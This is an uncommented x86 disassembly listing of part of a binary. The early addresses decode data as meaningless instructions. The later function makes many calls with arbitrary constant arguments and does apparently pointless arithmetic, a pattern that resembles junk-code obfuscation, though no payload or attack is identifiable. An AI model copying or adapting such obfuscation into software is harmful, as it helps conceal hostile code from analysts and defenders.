  406d2c:	add    BYTE PTR [esi],dl
  406d2e:	add    BYTE PTR [eax+ecx*2],al
  406d31:	or     BYTE PTR [eax],al
  406d33:	sbb    BYTE PTR [eax+0x8],al
  406d36:	add    al,0x60
  406d38:	inc    edx
  406d39:	xor    BYTE PTR [ecx],al
  406d3b:	add    BYTE PTR [eax-0x60],ah
  406d3e:	dec    eax
  406d3f:	add    BYTE PTR [eax+0x0],al
  406d42:	inc    edx
  406d43:	add    BYTE PTR [edx],al
  406d45:	add    ah,ah
  406d47:	add    BYTE PTR [eax],dl
  406d49:	ror    BYTE PTR [ecx],0x20
  406d4c:	and    BYTE PTR [ebp+0x32],cl
  406d4f:	add    BYTE PTR [ecx+edx*1],dh
  406d52:	add    BYTE PTR [eax+0x20],al
  406d55:	xor    BYTE PTR [eax+0x1602400],0x0
  406d5c:	add    cl,al
  406d5e:	push   edx
  406d5f:	xor    al,0x20
  406d61:	push   eax
  406d62:	adc    BYTE PTR [eax],al
  406d64:	test   DWORD PTR [eax],edx
  406d66:	and    DWORD PTR [edi],esp
  406d68:	retf   0x8026
  406d6b:	or     BYTE PTR [edx],cl
  406d6d:	add    BYTE PTR [ecx],0x84
  406d70:	add    eax,DWORD PTR [ecx]
  406d72:	nop
  406d73:	add    BYTE PTR [eax],cl
  406d75:	rol    BYTE PTR [eax],0x10
  406d78:	and    eax,DWORD PTR [edx+edx*1]
  406d7b:	add    BYTE PTR [eax],al
  406d7d:	inc    eax
  406d7e:	add    BYTE PTR ds:0x44400800,ah
  406d84:	rol    BYTE PTR [eax-0x65fcf6fc],1
  406d8a:	add    BYTE PTR [eax],al
  406d8c:	and    al,0x80
  406d8e:	and    BYTE PTR [ecx+0x409009b5],dl
  406d94:	adc    DWORD PTR [ecx+eax*8],eax
  406d97:	mov    al,ds:0x8250400c
  406d9c:	push   es
  406d9d:	loopne 0x406de4
  406d9f:	inc    ecx
  406da0:	add    bl,BYTE PTR [eax]
  406da2:	adc    BYTE PTR [eax-0x7df847f0],0x68
  406da9:	add    BYTE PTR [eax+eax*1-0x7ffee50f],al
  406db0:	rcl    al,0xe
  406db3:	add    BYTE PTR [ecx],al
  406db5:	add    cl,0x0
  406db8:	test   DWORD PTR [ecx+edx*1],eax
  406dbb:	add    al,0xd4
  406dbd:	add    DWORD PTR [eax],eax
  406dbf:	or     DWORD PTR [eax],ecx
  406dc1:	push   es
  406dc2:	add    al,BYTE PTR [eax]
  406dc4:	loopne 0x406e08
  406dc6:	push   es
  406dc7:	add    ah,BYTE PTR [eax]
  406dc9:	shl    DWORD PTR [eax-0x7fdb8000],1
  406dcf:	mov    al,BYTE PTR [esp]
  406dd2:	mov    BYTE PTR [ebp+0x40],al
  406dd5:	adc    al,al
  406dd7:	pop    edx
  406dd8:	add    BYTE PTR [ecx],ah
  406dda:	in     al,0x80
  406ddc:	add    cl,BYTE PTR [edx+0x18002020]
  406de2:	pusha  
  406de3:	and    al,0x0
  406de5:	adc    eax,DWORD PTR [eax]
  406de7:	push   eax
  406de8:	or     al,0x80
  406dea:	adc    BYTE PTR [esi+0x54104480],ah
  406df0:	add    BYTE PTR [edx],ah
  406df2:	mov    al,0x0
  406df4:	add    eax,DWORD PTR [eax+eiz*1]
  406df7:	and    BYTE PTR [edx+0x40201401],ah
  406dfd:	adc    DWORD PTR [eax+0x12004400],ecx
  406e03:	add    DWORD PTR [ebx],0x60f0040c
  406e09:	add    cl,dl
  406e0b:	or     BYTE PTR [eax+eax*1],bl
  406e0e:	xor    al,BYTE PTR [eax]
  406e10:	add    al,BYTE PTR [edx+eax*1]
  406e13:	adc    BYTE PTR [ebp+0x2a048059],dl
  406e19:	add    dl,BYTE PTR [eax+edx*4+0x48000]
  406e20:	inc    ax
  406e22:	or     BYTE PTR [eax],al
  406e24:	adc    BYTE PTR [eax-0x38],cl
  406e27:	add    BYTE PTR [eax],0x10
  406e2a:	shl    BYTE PTR ds:0x9160aec0,0x0
  406e31:	or     al,0x44
  406e33:	mov    ebp,0x4010a058
  406e38:	les    ebx,FWORD PTR [eax]
  406e3a:	add    BYTE PTR [eax+0x0],0x80
  406e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e3f:	add    al,0x90
  406e41:	add    BYTE PTR [eax+0x0],ah
  406e44:	rcr    BYTE PTR [edx+0x0],0xc8
  406e48:	adc    DWORD PTR [eax],edx
  406e4a:	add    BYTE PTR [ecx],al
  406e4c:	adc    DWORD PTR [eax],0x4c0140
  406e52:	add    eax,0x12025608
  406e57:	clc    
  406e58:	add    ah,cl
  406e5a:	add    BYTE PTR [edx],0x18
  406e5d:	add    al,BYTE PTR [eax+0x2210600]
  406e63:	adc    al,cl
  406e65:	dec    eax
  406e66:	test   BYTE PTR [eax+ecx*1],cl
  406e69:	add    BYTE PTR [eax],cl
  406e6b:	pop    ds
  406e6c:	mov    eax,ds:0xb09042
  406e71:	adc    al,0x65
  406e73:	add    BYTE PTR [ecx+0xc],ah
  406e76:	add    BYTE PTR [eax],al
  406e78:	dec    esp
  406e79:	adc    BYTE PTR [eax+0x11640044],bh
  406e7f:	enter  0x40a0,0x42
  406e83:	inc    eax
  406e84:	sub    DWORD PTR [ecx],eax
  406e86:	inc    edx
  406e87:	adc    BYTE PTR [eax-0x7e],al
  406e8a:	dec    eax
  406e8b:	or     al,0x84
  406e8d:	or     DWORD PTR [eax-0x66cf3f38],0x201024
  406e97:	add    BYTE PTR ds:0x40084089,al
  406e9d:	add    BYTE PTR [eax],al
  406e9f:	pop    esi
  406ea0:	adc    DWORD PTR [ecx+0x2c040010],edx
  406ea6:	inc    eax
  406ea7:	inc    ebp
  406ea8:	add    DWORD PTR [eax+0x10024],0x4000
  406eb2:	add    BYTE PTR [esp+eax*1],cl
  406eb5:	mov    al,0x40
  406eb7:	xor    DWORD PTR [ecx],eax
  406eb9:	or     al,BYTE PTR [esi]
  406ebb:	push   cs
  406ebc:	or     DWORD PTR [esi+eax*2],eax
  406ebf:	add    BYTE PTR [ecx],al
  406ec1:	or     DWORD PTR es:[eax+0x404451],eax
  406ec8:	dec    edx
  406ec9:	push   esp
  406eca:	or     BYTE PTR [eax],al
  406ecc:	add    BYTE PTR [eax+0x10],al
  406ecf:	adc    edx,DWORD PTR [ecx+eax*4]
  406ed2:	add    BYTE PTR [eax],al
  406ed4:	adc    DWORD PTR [eax],ebx
  406ed6:	xchg   BYTE PTR [edx+eax*1+0x4],bl
  406eda:	and    BYTE PTR [edx],cl
  406edc:	sbb    BYTE PTR [eax+0x10],ah
  406edf:	add    BYTE PTR [ebp+0x0],al
  406ee2:	and    cl,BYTE PTR [ebx]
  406ee4:	add    BYTE PTR [eax+0x40c71000],ah
  406eea:	or     eax,0x20880011
  406eef:	add    BYTE PTR [eax+0x10a22044],al
  406ef5:	add    DWORD PTR [eax],0xffffff82
  406ef8:	add    BYTE PTR [eax+0x4],ah
  406efb:	adc    BYTE PTR [eax],al
  406efd:	inc    esp
  406efe:	add    BYTE PTR [ebx],al
  406f00:	dec    edx
  406f01:	and    BYTE PTR [eax],ch
  406f03:	daa    
  406f04:	and    DWORD PTR [eax],eax
  406f06:	sub    BYTE PTR [eax],al
  406f08:	push   es
  406f09:	push   eax
  406f0a:	shl    BYTE PTR [edx-0x7dffebbe],0x65
  406f11:	add    BYTE PTR [eax],al
  406f13:	add    DWORD PTR [eax+edx*4],eax
  406f16:	add    BYTE PTR [ecx+0x8],al
  406f19:	inc    eax
  406f1a:	dec    eax
  406f1b:	adc    bh,0x14
  406f1e:	add    BYTE PTR [eax],cl
  406f20:	add    BYTE PTR [eax+eax*2-0x80],ah
  406f24:	add    BYTE PTR [eax+0x467000],dh
  406f2a:	add    BYTE PTR [eax+eax*8],bl
  406f2d:	sub    BYTE PTR [eax],ah
  406f2f:	adc    BYTE PTR [ebp+0x1019000c],dl
  406f35:	adc    DWORD PTR [edx+edx*1],eax
  406f38:	add    BYTE PTR [eax],cl
  406f3a:	add    BYTE PTR ds:0x40200040,bl
  406f40:	add    al,0x0
  406f42:	or     al,al
  406f44:	mov    eax,ds:0x908c4431
  406f49:	inc    eax
  406f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4b:	cwde   
  406f4c:	inc    ebx
  406f4d:	int3   
  406f4e:	adc    al,0x30
  406f50:	or     BYTE PTR [edi+0x2141388],ah
  406f56:	xor    dl,BYTE PTR [edx+edx*1+0x0]
  406f5a:	les    esp,FWORD PTR [eax+0x880450c]
  406f60:	add    BYTE PTR [eax-0x6b7fff00],al
  406f66:	add    BYTE PTR [eax],al
  406f68:	and    BYTE PTR [eax],al
  406f6a:	adc    al,BYTE PTR [eax]
  406f6c:	inc    eax
  406f6d:	and    BYTE PTR [eax-0x7f],al
  406f70:	adc    BYTE PTR [eax],al
  406f72:	xor    BYTE PTR [edx],al
  406f74:	push   eax
  406f75:	adc    BYTE PTR [eax+edx*4],dl
  406f78:	adc    BYTE PTR [eax],al
  406f7a:	add    BYTE PTR [esi],cl
  406f7c:	add    BYTE PTR [edx],0x1
  406f7f:	add    DWORD PTR [eax-0x60],eax
  406f82:	pusha  
  406f83:	adc    al,BYTE PTR [edx+edx*8]
  406f86:	or     BYTE PTR [eax],dl
  406f88:	adc    al,BYTE PTR [eax]
  406f8a:	add    bh,al
  406f8c:	add    al,0x20
  406f8e:	and    BYTE PTR [eax+0x8],0x58
  406f92:	es adc al,0x88
  406f95:	inc    eax
  406f96:	inc    esp
  406f97:	adc    cl,BYTE PTR [esi-0x80]
  406f9a:	add    BYTE PTR [ecx],al
  406f9c:	int3   
  406f9d:	and    BYTE PTR [eax],al
  406f9f:	adc    BYTE PTR [eax+0x4001810],0x19
  406fa6:	add    al,0x4
  406fa8:	inc    ebp
  406fa9:	inc    eax
  406faa:	mov    dl,0x8
  406fac:	add    DWORD PTR [ecx],eax
  406fae:	add    al,0x84
  406fb0:	add    BYTE PTR [eax],al
  406fb2:	add    BYTE PTR [eax],al
  406fb4:	dec    eax
	...
  406ff9:	add    BYTE PTR [eax],al
  406ffb:	add    BYTE PTR [ebp-0x75],dl
  406ffe:	in     al,dx
  406fff:	sub    esp,0x4c
  407002:	mov    eax,0x38
  407007:	push   0x6a6cc900
  40700c:	push   0xaa2c9400
  407011:	push   0xaa3d4600
  407016:	call   0x409461
  40701b:	add    esp,0xc
  40701e:	push   ebx
  40701f:	push   0xffffffdd
  407021:	call   0x409736
  407026:	add    esp,0x4
  407029:	push   0xffffffc8
  40702b:	call   0x409aad
  407030:	add    esp,0x4
  407033:	push   esi
  407034:	xor    ecx,ecx
  407036:	push   0xffffffc7
  407038:	push   0x32
  40703a:	push   0xfffffff9
  40703c:	push   0x56f3b700
  407041:	call   0x40957c
  407046:	add    esp,0x10
  407049:	push   edi
  40704a:	mov    ebx,0x5f4a
  40704f:	push   0x28
  407051:	push   0x6a0d1a00
  407056:	push   0xffffffa8
  407058:	call   0x409bc5
  40705d:	add    esp,0xc
  407060:	mov    edx,0xc2
  407065:	call   0x409aad
  40706a:	push   0xffffffca
  40706c:	push   0x2e
  40706e:	call   0x409aad
  407073:	add    esp,0x8
  407076:	mov    DWORD PTR [ebp-0x10],ebx
  407079:	sub    ebx,eax
  40707b:	push   0xffffff81
  40707d:	push   0xffffff84
  40707f:	push   0x5
  407081:	call   0x409967
  407086:	add    esp,0xc
  407089:	add    DWORD PTR [ebp-0x10],eax
  40708c:	call   0x40980d
  407091:	cmp    ebx,DWORD PTR [ebp-0x34]
  407094:	je     0x407099
  407096:	sub    DWORD PTR [ebp-0x10],ebx
  407099:	push   0xffffffb1
  40709b:	call   0x409bc5
  4070a0:	add    esp,0x4
  4070a3:	call   0x409736
  4070a8:	push   0x8ae28e00
  4070ad:	push   0x76d40c00
  4070b2:	push   0x2a4c2000
  4070b7:	call   0x409461
  4070bc:	add    esp,0xc
  4070bf:	push   0x26b19400
  4070c4:	call   0x409736
  4070c9:	add    esp,0x4
  4070cc:	push   0xfec7e100
  4070d1:	push   0x51
  4070d3:	push   0x2ed33600
  4070d8:	push   0xea74f300
  4070dd:	call   0x409967
  4070e2:	add    esp,0x10
  4070e5:	push   0x52312c00
  4070ea:	push   0xf07fe100
  4070ef:	push   0x7b
  4070f1:	push   0x523bd400
  4070f6:	push   0x7c
  4070f8:	call   0x40957c
  4070fd:	add    esp,0x14
  407100:	xor    eax,eax
  407102:	mov    edx,DWORD PTR [ebp-0x10]
  407105:	cmp    edx,DWORD PTR [ebp-0x4]
  407108:	je     0x40710d
  40710a:	add    DWORD PTR [ebp-0x10],edx
  40710d:	add    DWORD PTR [ebp-0x10],eax
  407110:	push   0xffffffbb
  407112:	push   0xfffffff0
  407114:	push   0x77
  407116:	call   0x409736
  40711b:	add    esp,0xc
  40711e:	mov    eax,DWORD PTR [ebp-0x10]
  407121:	mov    edx,DWORD PTR [ebp-0x10]
  407124:	push   0x2d
  407126:	call   0x409aad
  40712b:	add    esp,0x4
  40712e:	call   0x409736
  407133:	push   0x32
  407135:	push   0xfffffff1
  407137:	push   0x2a6ee500
  40713c:	call   0x40980d
  407141:	add    esp,0xc
  407144:	push   0xf2020000
  407149:	call   0x409d18
  40714e:	add    esp,0x4
  407151:	mov    esi,0xda
  407156:	push   0x79
  407158:	push   0xfffffffa
  40715a:	push   0x602ec400
  40715f:	push   0x23
  407161:	call   0x409aad
  407166:	add    esp,0x10
  407169:	push   0x1040fc00
  40716e:	call   0x40980d
  407173:	add    esp,0x4
  407176:	and    esi,eax
  407178:	mov    edi,DWORD PTR ds:0x438468
  40717e:	push   0x70
  407180:	call   0x409bc5
  407185:	add    esp,0x4
  407188:	push   0xffffffab
  40718a:	push   0x45
  40718c:	push   0xf263d800
  407191:	call   0x409461
  407196:	add    esp,0xc
  407199:	push   0xbaac0700
  40719e:	push   0x25
  4071a0:	push   0xffffffb6
  4071a2:	push   0x66b400
  4071a7:	call   0x409d18
  4071ac:	add    esp,0x10
  4071af:	push   0x1a
  4071b1:	call   0x409967
  4071b6:	add    esp,0x4
  4071b9:	push   0x2a7da700
  4071be:	call   0x409967
  4071c3:	add    esp,0x4
  4071c6:	push   0xffffff87
  4071c8:	call   0x409736
  4071cd:	add    esp,0x4
  4071d0:	push   0x203fba00
  4071d5:	push   0x4a81d600
  4071da:	push   0x74
  4071dc:	call   0x409aad
  4071e1:	add    esp,0xc
  4071e4:	push   0x70
  4071e6:	call   0x40980d
  4071eb:	add    esp,0x4
  4071ee:	cmp    esi,0x950a
  4071f4:	jne    0x4072ab
  4071fa:	push   0x2a7f5800
  4071ff:	push   0xc0630200
  407204:	push   0x600cc500
  407209:	push   0xffffff93
  40720b:	push   0x40
  40720d:	call   0x40980d
  407212:	add    esp,0x14
  407215:	push   0xd26d5c00
  40721a:	call   0x409d18
  40721f:	add    esp,0x4
  407222:	add    DWORD PTR [ebp-0x10],esi
  407225:	call   0x409736
  40722a:	xor    DWORD PTR [ebp-0x10],esi
  40722d:	call   0x409967
  407232:	and    edi,ebx
  407234:	mov    eax,0x8a
  407239:	push   0xffffffac
  40723b:	call   0x409967
  407240:	add    esp,0x4
  407243:	push   0xf2133900
  407248:	push   0x21
  40724a:	push   0xfffffff7
  40724c:	push   0x522d3800
  407251:	push   0x3e
  407253:	call   0x409736
  407258:	add    esp,0x14
  40725b:	and    edi,eax
  40725d:	sub    edi,ebx
  40725f:	mov    eax,0xfb57
  407264:	push   0xffffff97
  407266:	push   0x791800
  40726b:	push   0xffffffdf
  40726d:	push   0xffffff8c
  40726f:	push   0xffffffc2
  407271:	call   0x409967
  407276:	add    esp,0x14
  407279:	push   0xf2373500
  40727e:	call   0x409aad
  407283:	add    esp,0x4
  407286:	push   0xffffff94
  407288:	push   0xffffffc2
  40728a:	call   0x409aad
  40728f:	add    esp,0x8
  407292:	push   0x2917b00
  407297:	push   0xd
  407299:	push   0x17
  40729b:	call   0x409967
  4072a0:	add    esp,0xc
  4072a3:	call   0x409736
  4072a8:	mov    DWORD PTR [ebp-0x10],edi
  4072ab:	push   0xffffffcf
  4072ad:	push   0x2d
  4072af:	push   0x34
  4072b1:	call   0x409aad
  4072b6:	add    esp,0xc
  4072b9:	xor    ecx,ecx
  4072bb:	push   0xffffff9f
  4072bd:	push   0x502fd500
  4072c2:	call   0x409736
  4072c7:	add    esp,0x8
  4072ca:	push   0xffffff87
  4072cc:	push   0x30
  4072ce:	push   0x5076cd00
  4072d3:	call   0x409d18
  4072d8:	add    esp,0xc
  4072db:	push   0x4ee04900
  4072e0:	push   0x46fc00
  4072e5:	push   0x6a2e4400
  4072ea:	push   0xfffffff6
  4072ec:	push   0x37
  4072ee:	call   0x40980d
  4072f3:	add    esp,0x14
  4072f6:	push   0xffffff93
  4072f8:	call   0x409aad
  4072fd:	add    esp,0x4
  407300:	push   0xffffffc1
  407302:	push   0xd2206900
  407307:	push   0x4adcf500
  40730c:	call   0x409aad
  407311:	add    esp,0xc
  407314:	push   0xffffffd6
  407316:	push   0xea9f5100
  40731b:	push   0xffffffe4
  40731d:	push   0x32
  40731f:	push   0xea3d2900
  407324:	call   0x409aad
  407329:	add    esp,0x14
  40732c:	push   0x6ae59800
  407331:	push   0x6e9800
  407336:	push   0xf6e8a500
  40733b:	push   0xb
  40733d:	push   0xd
  40733f:	call   0x409461
  407344:	add    esp,0x14
  407347:	push   0xffffffb8
  407349:	push   0x2a24eb00
  40734e:	push   0xdef1ca00
  407353:	push   0xa6dabe00
  407358:	push   0xd2378e00
  40735d:	call   0x409461
  407362:	add    esp,0x14
  407365:	call   0x409736
  40736a:	mov    esi,edi
  40736c:	or     esi,edi
  40736e:	push   0x8e9d6500
  407373:	push   0xea7ef900
  407378:	call   0x409bc5
  40737d:	add    esp,0x8
  407380:	push   0xffffffc7
  407382:	push   0xfffffff6
  407384:	push   0xc0325900
  407389:	push   0xffffffb5
  40738b:	push   0x79
  40738d:	call   0x409967
  407392:	add    esp,0x14
  407395:	push   0x4e
  407397:	push   0x26b08a00
  40739c:	push   0xffffffd0
  40739e:	push   0x2e
  4073a0:	push   0x5248e900
  4073a5:	call   0x409736
  4073aa:	add    esp,0x14
  4073ad:	push   0x2b
  4073af:	push   0x57
  4073b1:	push   0x7d
  4073b3:	call   0x409967
  4073b8:	add    esp,0xc
  4073bb:	sub    esi,ebx
  4073bd:	add    DWORD PTR [ebp-0x10],esi
  4073c0:	push   0x6a769300
  4073c5:	call   0x409461
  4073ca:	add    esp,0x4
  4073cd:	xor    esi,esi
  4073cf:	push   0xffffffab
  4073d1:	call   0x409967
  4073d6:	add    esp,0x4
  4073d9:	push   0x2a15d800
  4073de:	call   0x409967
  4073e3:	add    esp,0x4
  4073e6:	mov    ebx,DWORD PTR ds:0x438468
  4073ec:	push   0x69
  4073ee:	push   0xffffffab
  4073f0:	push   0x8e880500
  4073f5:	push   0xffffffd3
  4073f7:	push   0x25
  4073f9:	call   0x40957c
  4073fe:	add    esp,0x14
  407401:	push   0x22cf6700
  407406:	push   0x7e
  407408:	push   0x4
  40740a:	call   0x409461
  40740f:	add    esp,0xc
  407412:	push   0x34
  407414:	push   0xffffff93
  407416:	push   0xaa2e0000
  40741b:	call   0x409bc5
  407420:	add    esp,0xc
  407423:	and    esi,edi
  407425:	push   0xffffff94
  407427:	push   0xffffffc7
  407429:	push   0xffffff93
  40742b:	push   0x7c
  40742d:	call   0x40957c
  407432:	add    esp,0x10
  407435:	push   0x2ea26f00
  40743a:	push   0xffffffd3
  40743c:	call   0x409967
  407441:	add    esp,0x8
  407444:	push   0xea556400
  407449:	push   0x9ad1a500
  40744e:	push   0xc04da800
  407453:	push   0xffffffa1
  407455:	push   0x4022fc00
  40745a:	call   0x409aad
  40745f:	add    esp,0x14
  407462:	call   0x40957c
  407467:	push   0xffffff98
  407469:	call   0x409736
  40746e:	add    esp,0x4
  407471:	add    esi,edi
  407473:	add    DWORD PTR [ebp-0x10],ebx
  407476:	cmp    esi,DWORD PTR ds:0x438468
  40747c:	je     0x407578
  407482:	mov    edx,DWORD PTR [ebp-0x10]
  407485:	add    edx,edx
  407487:	push   0xffffffae
  407489:	push   0xb00f6a00
  40748e:	call   0x409967
  407493:	add    esp,0x8
  407496:	call   0x409736
  40749b:	push   0x2b
  40749d:	call   0x409461
  4074a2:	add    esp,0x4
  4074a5:	push   0xdaa49200
  4074aa:	push   0x6073b300
  4074af:	push   0x3049ad00
  4074b4:	call   0x409d18
  4074b9:	add    esp,0xc
  4074bc:	call   0x409bc5
  4074c1:	push   0x70
  4074c3:	push   0xc05b1e00
  4074c8:	push   0x703ab400
  4074cd:	call   0x409d18
  4074d2:	add    esp,0xc
  4074d5:	mov    ebx,DWORD PTR [ebp-0x10]
  4074d8:	add    DWORD PTR [ebp-0x10],ebx
  4074db:	cmp    esi,DWORD PTR ds:0x438468
  4074e1:	je     0x407578
  4074e7:	push   0x8
  4074e9:	push   0x92a43500
  4074ee:	push   0xffffffaa
  4074f0:	push   0xf2376100
  4074f5:	call   0x409d18
  4074fa:	add    esp,0x10
  4074fd:	push   0x5200dc00
  407502:	push   0xb0518700
  407507:	push   0xd2d18900
  40750c:	push   0xffffffc8
  40750e:	call   0x409967
  407513:	add    esp,0x10
  407516:	add    esi,eax
  407518:	push   0x4d
  40751a:	push   0xdec63600
  40751f:	call   0x409aad
  407524:	add    esp,0x8
  407527:	push   0x2a20e700
  40752c:	push   0xf05c8b00
  407531:	call   0x409967
  407536:	add    esp,0x8
  407539:	push   0xffffff8f
  40753b:	push   0xffffffc2
  40753d:	push   0x46cdd800
  407542:	push   0xfe9fe800
  407547:	push   0x6a6eec00
  40754c:	call   0x409aad
  407551:	add    esp,0x14
  407554:	add    esi,eax
  407556:	and    esi,eax
  407558:	mov    ecx,DWORD PTR ds:0x438468
  40755e:	push   0x82a90c00
  407563:	push   0xb2a95900
  407568:	push   0x2a6dc200
  40756d:	call   0x409d18
  407572:	add    esp,0xc
  407575:	or     DWORD PTR [ebp-0x10],esi
  407578:	push   0xffffffb3
  40757a:	push   0x428ba900
  40757f:	call   0x409aad
  407584:	add    esp,0x8
  407587:	push   0x105b9200
  40758c:	call   0x40980d
  407591:	add    esp,0x4
  407594:	test   esi,0x95
  40759a:	je     0x4075a1
  40759c:	add    eax,esi
  40759e:	sub    DWORD PTR [ebp-0x10],eax
  4075a1:	sub    DWORD PTR [ebp-0x10],eax
  4075a4:	call   0x40957c
  4075a9:	push   0x26
  4075ab:	push   0x0
  4075ad:	call   DWORD PTR ds:0x438338
  4075b3:	add    DWORD PTR [ebp-0x10],esi
  4075b6:	cmp    eax,0xd967
  4075bb:	je     0x407728
  4075c1:	push   0x5
  4075c3:	push   0xffffffa6
  4075c5:	push   0xffffff82
  4075c7:	push   0x67
  4075c9:	push   0x65
  4075cb:	call   0x409d18
  4075d0:	add    esp,0x14
  4075d3:	push   0x69
  4075d5:	push   0xfae9e400
  4075da:	push   0x3f
  4075dc:	push   0x1eb61800
  4075e1:	push   0x52408f00
  4075e6:	call   0x409bc5
  4075eb:	add    esp,0x14
  4075ee:	mov    edi,0xd5
  4075f3:	mov    ebx,DWORD PTR [ebp-0x10]
  4075f6:	push   0x73
  4075f8:	push   0xffffff83
  4075fa:	push   0xffffff9c
  4075fc:	push   0xffffffff
  4075fe:	push   0x7d
  407600:	call   0x409aad
  407605:	add    esp,0x14
  407608:	push   0x7f
  40760a:	push   0x40
  40760c:	push   0x202bb800
  407611:	push   0xd260df00
  407616:	call   0x40980d
  40761b:	add    esp,0x10
  40761e:	sub    ebx,esi
  407620:	push   0x80604100
  407625:	push   0x5043bc00
  40762a:	push   0xdae5d300
  40762f:	call   0x40957c
  407634:	add    esp,0xc
  407637:	mov    ecx,DWORD PTR [ebp-0x10]
  40763a:	push   0x35
  40763c:	call   0x409aad
  407641:	add    esp,0x4
  407644:	push   0x16d9c200
  407649:	push   0x54
  40764b:	push   0x2892a00
  407650:	call   0x409461
  407655:	add    esp,0xc
  407658:	add    DWORD PTR [ebp-0x10],edi
  40765b:	push   0x22
  40765d:	push   0xea392700
  407662:	push   0xffffffe4
  407664:	push   0xeeeb2800
  407669:	call   0x409461
  40766e:	add    esp,0x10
  407671:	push   0xffffffc8
  407673:	push   0xea868700
  407678:	push   0x2a91b400
  40767d:	push   0xffffff98
  40767f:	push   0xf2777f00
  407684:	call   0x409aad
  407689:	add    esp,0x14
  40768c:	push   0xa2c85c00
  407691:	push   0x62
  407693:	push   0xffffffd2
  407695:	call   0x409461
  40769a:	add    esp,0xc
  40769d:	push   0x6a
  40769f:	push   0x63
  4076a1:	push   0xffffffc1
  4076a3:	call   0x40980d
  4076a8:	add    esp,0xc
  4076ab:	push   0x47
  4076ad:	push   0xd2201f00
  4076b2:	push   0x86dc7e00
  4076b7:	push   0xffffff92
  4076b9:	call   0x40980d
  4076be:	add    esp,0x10
  4076c1:	push   0xffffffa5
  4076c3:	push   0x62
  4076c5:	push   0x92f46c00
  4076ca:	call   0x40980d
  4076cf:	add    esp,0xc
  4076d2:	push   0x26ec0e00
  4076d7:	call   0x409bc5
  4076dc:	add    esp,0x4
  4076df:	push   0x3f
  4076e1:	push   0xf2034500
  4076e6:	call   0x409461
  4076eb:	add    esp,0x8
  4076ee:	push   0x6b
  4076f0:	push   0x901fb200
  4076f5:	push   0x76aaa200
  4076fa:	push   0xd2a28800
  4076ff:	push   0xffffff93
  407701:	call   0x409461
  407706:	add    esp,0x14
  407709:	add    DWORD PTR [ebp-0x10],ebx
  40770c:	mov    DWORD PTR [ebp-0x10],eax
  40770f:	mov    DWORD PTR [ebp-0x48],edi
  407712:	cmp    ebx,DWORD PTR [ebp-0x10]
  407715:	je     0x407728
  407717:	push   0x6ecc5300
  40771c:	push   0xffffffc4
  40771e:	push   0x67
  407720:	call   0x409aad
  407725:	add    esp,0xc
  407728:	sub    DWORD PTR [ebp-0x10],edi
  40772b:	push   0x400e9c00
  407730:	push   0x9004fc00
  407735:	push   0xde8e0c00
  40773a:	call   0x409d18
  40773f:	add    esp,0xc
  407742:	lea    eax,[ebp-0xc]
  407745:	push   eax
  407746:	call   DWORD PTR ds:0x438334
  40774c:	sub    esi,ebx
  40774e:	mov    ebx,0x61
  407753:	and    DWORD PTR [ebp-0x10],ebx
  407756:	add    esi,eax
  407758:	mov    edi,DWORD PTR [ebp-0x10]
  40775b:	add    DWORD PTR [ebp-0x10],edi
  40775e:	cmp    esi,ebx
  407760:	je     0x407765
  407762:	add    DWORD PTR [ebp-0x10],esi
  407765:	cmp    eax,DWORD PTR [ebp-0x48]
  407768:	jne    0x407843
  40776e:	sub    eax,edi
  407770:	cmp    edi,eax
  407772:	je     0x40777b
  407774:	sub    eax,ebx
  407776:	call   0x409461
  40777b:	push   0x12dc5500
  407780:	push   0xfffffffd
  407782:	call   0x409461
  407787:	add    esp,0x8
  40778a:	mov    ecx,DWORD PTR ds:0x438468
  407790:	mov    edi,DWORD PTR [ebp-0x10]
  407793:	or     edi,esi
  407795:	sub    DWORD PTR [ebp-0x10],ecx
  407798:	cmp    edi,0x24
  40779b:	jne    0x4077a4
  40779d:	sub    edi,ebx
  40779f:	sub    edi,ebx
  4077a1:	add    DWORD PTR [ebp-0x10],edi
  4077a4:	mov    eax,DWORD PTR [ebp-0x10]
  4077a7:	mov    esi,0xb2
  4077ac:	mov    DWORD PTR [ebp-0x10],eax
  4077af:	sub    DWORD PTR [ebp-0x10],eax
  4077b2:	add    esi,eax
  4077b4:	and    DWORD PTR [ebp-0x10],esi
  4077b7:	mov    ebx,0xf0
  4077bc:	sub    edi,ecx
  4077be:	and    DWORD PTR [ebp-0x10],edi
  4077c1:	cmp    edi,0x5be7
  4077c7:	jne    0x4077d0
  4077c9:	and    edi,ebx
  4077cb:	add    edi,edi
  4077cd:	sub    DWORD PTR [ebp-0x10],edi
  4077d0:	add    ebx,ecx
  4077d2:	push   0xf680a400
  4077d7:	push   0xea302c00
  4077dc:	push   0xb0490300
  4077e1:	call   0x409967
  4077e6:	add    esp,0xc
  4077e9:	mov    esi,DWORD PTR [ebp-0x10]
  4077ec:	xor    edx,edx
  4077ee:	push   0x47
  4077f0:	call   0x409461
  4077f5:	add    esp,0x4
  4077f8:	call   0x409461
  4077fd:	push   0x11
  4077ff:	push   0xd
  407801:	push   0xf255a200
  407806:	push   0x40
  407808:	call   0x409736
  40780d:	add    esp,0x10
  407810:	sub    DWORD PTR [ebp-0x10],esi
  407813:	push   0x10540900
  407818:	push   0x4d
  40781a:	push   0xffffffd7
  40781c:	call   0x40980d
  407821:	add    esp,0xc
  407824:	mov    DWORD PTR [ebp-0x4c],ebx
  407827:	push   0x3ae55d00
  40782c:	push   0x6047b000
  407831:	push   0x3021c100
  407836:	push   0x6a1f1600
  40783b:	call   0x409aad
  407840:	add    esp,0x10
  407843:	push   0x5d
  407845:	push   0x37
  407847:	push   0xffffffce
  407849:	call   0x409d18
  40784e:	add    esp,0xc
  407851:	mov    edx,0xb9
  407856:	add    edx,ebx
  407858:	sub    DWORD PTR [ebp-0x10],edx
  40785b:	call   DWORD PTR ds:0x438324
  407861:	mov    edi,0x8857
  407866:	sub    DWORD PTR [ebp-0x10],eax
  407869:	xor    DWORD PTR [ebp-0x10],ebx
  40786c:	mov    ebx,esi
  40786e:	add    edi,ebx
  407870:	sub    DWORD PTR [ebp-0x10],edi
  407873:	mov    DWORD PTR [ebp-0x4],eax
  407876:	push   0x4d
  407878:	call   0x409bc5
  40787d:	add    esp,0x4
  407880:	call   0x409461
  407885:	call   DWORD PTR ds:0x438374
  40788b:	mov    ecx,DWORD PTR [ebp-0x10]
  40788e:	mov    edx,DWORD PTR [ebp-0x10]
  407891:	mov    DWORD PTR [ebp-0x20],edx
  407894:	cmp    ecx,ebx
  407896:	jne    0x40789b
